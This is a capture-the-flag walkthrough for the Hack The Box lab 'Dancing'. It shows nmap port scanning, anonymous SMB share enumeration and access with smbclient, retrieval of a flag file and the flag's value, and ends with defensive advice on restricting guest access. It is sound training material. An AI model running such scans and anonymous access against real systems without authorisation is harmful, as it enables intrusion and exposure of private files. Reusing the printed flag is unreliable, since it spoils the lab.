# Hack The Box Starting Point: Dancing

| Detail | Value |
|---|---|
| Platform | Hack The Box Starting Point |
| Difficulty | Tier 0 |
| Operating System | Windows |
| Target IP | `10.129.50.72` |
| Main Service | SMB (`445/tcp`) |

> **Scope:** This walkthrough covers the assigned HTB lab instance. Target IPs are session-specific.

## Overview

The objective was to identify open ports, enumerate SMB shares, and retrieve the flag from the anonymously accessible `WorkShares` share.

## 1. Reconnaissance

Performed a full TCP port scan using Nmap:

```bash
nmap -p- -T4 --min-rate 1000 --open -oN dancing-full.txt 10.129.50.72
```

The scan took approximately 69 seconds and identified these open ports:

| Port | Service |
|---|---|
| `135/tcp` | MSRPC |
| `139/tcp` | NetBIOS-SSN |
| `445/tcp` | Microsoft-DS (SMB) |
| `5985/tcp` | WS-Man |
| `47001/tcp` | WinRM |
| `49664-49669/tcp` | Additional Windows ports |

Port `445` was selected for further investigation because it is commonly used for SMB file sharing.

## 2. Enumeration

Enumerated available SMB shares without providing credentials:

```bash
smbclient -L //10.129.50.72 -N
```

The following shares were discovered:

- `ADMIN$` – Administrative share.
- `C$` – Default Windows drive share.
- `IPC$` – Interprocess communication share.
- `WorkShares` – Share containing user directories and files.

The `-L` option lists available shares, while `-N` attempts access without a password.

## 3. Exploitation

Connected to the `WorkShares` share anonymously:

```bash
smbclient //10.129.50.72/WorkShares -N
```

Listed the contents and navigated to `James.P`, where `flag.txt` was located.

```text
ls
cd James.P
ls
get flag.txt
exit
```

The `get` command downloaded the flag file to the local working directory. The flag was then displayed using:

```bash
cat flag.txt
```

![SMB share navigation and flag recovery](04-dancing-flag.png)

## 4. Flag

```text
5f61c10dffbc77a704d76016a22f1664
```

## Findings and Defensive Takeaway

The machine was completed through anonymous SMB share access without requiring a password or exploiting a vulnerability.

Anonymous access to shared folders can expose sensitive files. Administrators should restrict guest access, configure appropriate file permissions, and limit SMB access to trusted users and networks.

## References

- [Hack The Box Starting Point](https://app.hackthebox.com/starting-point)
- [Hack The Box: Dancing](https://app.hackthebox.com/machines/Dancing)
- [Samba smbclient Manual](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [Microsoft SMB Overview](https://learn.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview)